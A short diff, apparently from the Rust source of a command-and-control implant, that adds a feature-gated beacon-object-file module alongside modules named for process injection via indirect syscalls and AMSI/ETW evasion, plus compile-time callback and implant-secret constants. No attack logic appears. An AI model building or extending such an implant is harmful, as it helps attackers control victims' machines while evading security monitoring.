@@ -1,9 +1,9 @@
 mod stdlib;
-
 #[cfg(feature = "indirect-syscalls")]
 mod nt_inject;
-
 mod amsi_etw;
+#[cfg(feature = "cmd-bof")]
+mod bof;
 
 const CALLBACK: &str = env!("CALLBACK");
 const IMPLANT_SECRET: &str = env!("IMPLANT_SECRET");
